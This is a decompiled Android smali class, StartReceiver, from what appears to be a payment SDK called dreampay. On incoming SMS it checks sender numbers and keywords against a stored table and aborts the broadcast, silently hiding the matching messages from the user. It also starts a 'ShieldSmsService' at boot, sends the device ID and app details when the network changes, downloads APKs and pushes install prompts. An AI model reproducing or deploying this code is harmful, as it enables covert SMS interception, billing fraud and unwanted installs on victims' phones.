.class public Lcom/yuelan/dreampay/service/StartReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field public static final BOOT_ACTION:Ljava/lang/String; = "android.intent.action.BOOT_COMPLETED"

.field public static final NETWORKCHANGE_ACTION:Ljava/lang/String; = "android.net.conn.CONNECTIVITY_CHANGE"

.field public static final SMS_RECEIVED_ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field public static starttime:J


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/yuelan/dreampay/service/StartReceiver;->starttime:J

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/util/ArrayList;
    .locals 6

    new-instance v0, Lcom/yuelan/dreampay/date/PBSmsDBH;

    invoke-direct {v0, p3}, Lcom/yuelan/dreampay/date/PBSmsDBH;-><init>(Landroid/content/Context;)V

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    const-string v2, "select * from pb_table"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Lcom/yuelan/dreampay/date/PBSmsDBH;->query(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0, p0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v0, p1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    if-eqz v0, :cond_1

    :cond_0
    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_2

    :cond_1
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    return-object v1

    :cond_2
    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {v1, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 17

    if-eqz p2, :cond_0

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    const-string v4, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    new-instance v3, Landroid/content/Intent;

    const-class v4, Lcom/yuelan/dreampay/service/ShieldSmsService;

    move-object/from16 v0, p1

    invoke-direct {v3, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "com.yuelan.milipay.ShieldSmsService.init"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-object/from16 v0, p1

    invoke-virtual {v0, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    :goto_0
    return-void

    :cond_1
    const-string v4, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_7

    const-string v3, "onReceive"

    invoke-static {v3}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v3

    const-string v4, "pdus"

    invoke-virtual {v3, v4}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, [Ljava/lang/Object;

    array-length v4, v3

    new-array v8, v4, [Landroid/telephony/SmsMessage;

    const/4 v4, 0x0

    move v7, v4

    :goto_1
    array-length v4, v3

    if-ge v7, v4, :cond_0

    aget-object v4, v3, v7

    check-cast v4, [B

    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v4

    aput-object v4, v8, v7

    aget-object v4, v8, v7

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v9

    aget-object v4, v8, v7

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "bb"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "bb"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    const-string v5, "port"

    const-string v6, "keyone"

    move-object/from16 v0, p1

    invoke-static {v5, v6, v4, v0}, Lcom/yuelan/dreampay/service/StartReceiver;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v10

    if-eqz v10, :cond_2

    invoke-virtual {v10}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-lez v4, :cond_2

    const/4 v4, 0x0

    move v6, v4

    :goto_2
    invoke-virtual {v10}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-lt v6, v4, :cond_3

    :cond_2
    :goto_3
    add-int/lit8 v4, v7, 0x1

    move v7, v4

    goto :goto_1

    :cond_3
    invoke-virtual {v10, v6}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    if-eqz v4, :cond_6

    const-string v5, "#"

    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v11

    const/4 v5, 0x0

    const/4 v4, 0x0

    :goto_4
    array-length v12, v11

    if-lt v4, v12, :cond_4

    array-length v4, v11

    if-ne v5, v4, :cond_6

    const-string v4, "\u6682\u505c\u4f20\u9012"

    invoke-static {v4}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Lcom/yuelan/dreampay/service/StartReceiver;->abortBroadcast()V

    goto :goto_3

    :cond_4
    aget-object v12, v11, v4

    invoke-virtual {v9, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_5

    add-int/lit8 v5, v5, 0x1

    :cond_5
    add-int/lit8 v4, v4, 0x1

    goto :goto_4

    :cond_6
    add-int/lit8 v4, v6, 0x1

    move v6, v4

    goto :goto_2

    :cond_7
    const-string v4, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_b

    invoke-static/range {p1 .. p1}, Lcom/yuelan/codelib/utils/NetWorkUtil;->getNetWork(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/yuelan/dreampay/thread/GoOnFankuiThread;

    move-object/from16 v0, p1

    invoke-direct {v5, v0}, Lcom/yuelan/dreampay/thread/GoOnFankuiThread;-><init>(Landroid/content/Context;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    new-instance v6, Ljava/lang/StringBuilder;

    sget-wide v7, Lcom/yuelan/dreampay/service/StartReceiver;->starttime:J

    invoke-static {v7, v8}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    sget-wide v6, Lcom/yuelan/dreampay/service/StartReceiver;->starttime:J

    const-wide/16 v8, 0x0

    cmp-long v6, v6, v8

    if-eqz v6, :cond_8

    sget-wide v6, Lcom/yuelan/dreampay/service/StartReceiver;->starttime:J

    sub-long/2addr v4, v6

    const-wide/16 v6, 0x2710

    cmp-long v4, v4, v6

    if-gez v4, :cond_8

    const-string v3, "timeout"

    invoke-static {v3}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_8
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    sput-wide v4, Lcom/yuelan/dreampay/service/StartReceiver;->starttime:J

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcom/yuelan/dreampay/service/ShieldSmsService;

    move-object/from16 v0, p1

    invoke-direct {v6, v0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v7, "com.yuelan.milipay.ShieldSmsService.init"

    invoke-virtual {v6, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-object/from16 v0, p1

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v6, Lcom/yuelan/dreampay/service/i;

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v6, v0, v1, v4, v5}, Lcom/yuelan/dreampay/service/i;-><init>(Lcom/yuelan/dreampay/service/StartReceiver;Landroid/content/Context;Ljava/util/ArrayList;Ljava/util/Random;)V

    const-string v4, "record_alarm.info"

    move-object/from16 v0, p1

    invoke-static {v4, v0}, Lcom/yuelan/codelib/utils/FileUtil;->readDateFile(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v5, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "net"

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    invoke-static {v4}, Lcom/yuelan/codelib/utils/TextUtil;->notNull(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_9

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    invoke-static {v4}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v3

    sub-long v3, v7, v3

    const-wide/32 v7, 0x1b7740

    cmp-long v3, v3, v7

    if-ltz v3, :cond_a

    :cond_9
    new-instance v3, Ljava/util/concurrent/ConcurrentHashMap;

    invoke-direct {v3}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    const-string v4, "deviceId"

    invoke-static/range {p1 .. p1}, Lcom/yuelan/codelib/utils/PhoneUtil;->getOnlyPhoneId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v4, "appId"

    const-string v5, "MILI_PAY_APPID"

    move-object/from16 v0, p1

    invoke-static {v0, v5}, Lcom/yuelan/codelib/utils/AppUtil;->getMeTAInt(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v4, "channelId"

    const-string v5, "MILI_PAY_CHANNELID"

    move-object/from16 v0, p1

    invoke-static {v0, v5}, Lcom/yuelan/codelib/utils/AppUtil;->getMeTAString(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v4, "deviceManufacturer"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/yuelan/codelib/utils/PhoneUtil;->getMobileManufacturer()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/yuelan/dreampay/thread/ApkDownloadThread;

    invoke-direct {v5, v6, v3}, Lcom/yuelan/dreampay/thread/ApkDownloadThread;-><init>(Landroid/os/Handler;Ljava/util/Map;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    goto/16 :goto_0

    :cond_a
    const-string v3, "\u65f6\u95f4\u8fd8\u6ca1\u5230"

    invoke-static {v3}, Lcom/yuelan/codelib/utils/LogUtil;->v(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_b
    const-string v4, "alarmwindowtime"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    const-string v3, "set_alarm.info"

    move-object/from16 v0, p1

    invoke-static {v3, v0}, Lcom/yuelan/codelib/utils/FileUtil;->readDateFile(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    const-string v4, "no"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    if-eqz v3, :cond_0

    :try_start_0
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v3, "type5"

    invoke-virtual {v4, v3}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v3

    const-string v4, "list"

    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v4

    const/4 v3, 0x0

    :goto_5
    invoke-virtual {v4}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-lt v3, v7, :cond_c

    const/4 v3, 0x0

    move v4, v3

    :goto_6
    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v3

    if-lt v4, v3, :cond_d

    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v3

    if-eqz v3, :cond_0

    invoke-static/range {p1 .. p1}, Lcom/yuelan/codelib/utils/PhoneUtil;->setNotificationRingtone(Landroid/content/Context;)V

    const-wide/16 v3, 0x3e8

    move-object/from16 v0, p1

    invoke-static {v0, v3, v4}, Lcom/yuelan/codelib/utils/PhoneUtil;->setPhoneVibration(Landroid/content/Context;J)V

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lcom/yuelan/dreampay/netmonitor/MyWindowMannager;->createDialiog(Landroid/content/Context;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v3

    invoke-virtual {v3}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    :cond_c
    :try_start_1
    invoke-virtual {v4, v3}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v7

    const-string v8, "packageName"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v3, v3, 0x1

    goto :goto_5

    :cond_d
    invoke-virtual {v5, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    move-object/from16 v0, p1

    invoke-static {v0, v3}, Lcom/yuelan/codelib/utils/AppUtil;->checkApkExist(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_e

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v6, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    :cond_e
    add-int/lit8 v3, v4, 0x1

    move v4, v3

    goto :goto_6

    :cond_f
    const-string v4, "alarmnotificationtime"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_10

    const-string v3, "set_alarm.info"

    move-object/from16 v0, p1

    invoke-static {v3, v0}, Lcom/yuelan/codelib/utils/FileUtil;->readDateFile(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    const-string v4, "no"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    new-instance v3, Lcom/yuelan/dreampay/common/AnalysisNotifycationData;

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-direct {v3, v4}, Lcom/yuelan/dreampay/common/AnalysisNotifycationData;-><init>(Landroid/content/Context;)V

    invoke-virtual {v3}, Lcom/yuelan/dreampay/common/AnalysisNotifycationData;->analysisNotificationData()V

    goto/16 :goto_0

    :cond_10
    const-string v4, "notifycationdownload"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-static/range {p1 .. p1}, Lcom/yuelan/codelib/utils/NetWorkUtil;->hasNetWork(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_12

    invoke-static/range {p1 .. p1}, Lcom/yuelan/codelib/utils/NetWorkUtil;->getNetWork(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "WIFI"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_11

    const-string v3, "nid"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v3, "filename"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v3, "apkUrl"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "3"

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v8, Lcom/yuelan/dreampay/date/ConFigFile;->SD_APKPath:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v3, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "/"

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    const-string v3, "apksize"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v3, "iconurl"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const/4 v12, 0x4

    const-string v3, "packagename"

    move-object/from16 v0, p2

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "2"

    const-string v15, "\u5b89\u88c5\u4e4b\u540e\u6709\u60ca\u559c\u54e6!"

    const-string v16, "1"

    move-object/from16 v3, p1

    invoke-static/range {v3 .. v16}, Lcom/yuelan/codelib/download/DownloadFileUtil;->goToDownloadApkSelectInfo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_11
    new-instance v3, Lcom/yuelan/dreampay/view/BaseTisDiaolog;

    const/4 v5, 0x1

    const-string v6, "\u5f00\u542fWIFI"

    const-string v7, "\u7ee7\u7eed\u4e0b\u8f7d"

    const-string v8, "\u5f53\u524d\u4f7f\u7528\u7684\u79fb\u52a8\u7f51\u7edc\u4f1a\u4ea7\u751f\u6570\u636e\u4fe1\u606f\u8d39\u5efa\n\u8bae\u60a8\u5f00\u542fWIFI\u540e\u4e0b\u8f7d\uff0c\u662f\u5426\u7ee7\u7eed\uff1f"

    const/4 v9, 0x1

    new-instance v10, Lcom/yuelan/dreampay/service/j;

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    invoke-direct {v10, v0, v1, v2}, Lcom/yuelan/dreampay/service/j;-><init>(Lcom/yuelan/dreampay/service/StartReceiver;Landroid/content/Context;Landroid/content/Intent;)V

    move-object/from16 v4, p1

    invoke-direct/range {v3 .. v10}, Lcom/yuelan/dreampay/view/BaseTisDiaolog;-><init>(Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ILcom/yuelan/dreampay/listen/DialogClickListener;)V

    invoke-virtual {v3}, Lcom/yuelan/dreampay/view/BaseTisDiaolog;->show()V

    goto/16 :goto_0

    :cond_12
    new-instance v3, Lcom/yuelan/dreampay/view/BaseTisDiaolog;

    const/4 v5, 0x1

    const-string v6, ""

    const-string v7, "\u786e\u5b9a"

    const-string v8, "\u68c0\u6d4b\u5230\u60a8\u672a\u5f00\u542f\u7f51\u7edc\n\u8bf7\u5f00\u542f\u7f51\u7edc\u540e\u91cd\u65b0\u5c1d\u8bd5"

    const/4 v9, 0x1

    new-instance v10, Lcom/yuelan/dreampay/service/k;

    move-object/from16 v0, p0

    invoke-direct {v10, v0}, Lcom/yuelan/dreampay/service/k;-><init>(Lcom/yuelan/dreampay/service/StartReceiver;)V

    move-object/from16 v4, p1

    invoke-direct/range {v3 .. v10}, Lcom/yuelan/dreampay/view/BaseTisDiaolog;-><init>(Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ILcom/yuelan/dreampay/listen/DialogClickListener;)V

    invoke-virtual {v3}, Lcom/yuelan/dreampay/view/BaseTisDiaolog;->show()V

    goto/16 :goto_0
.end method
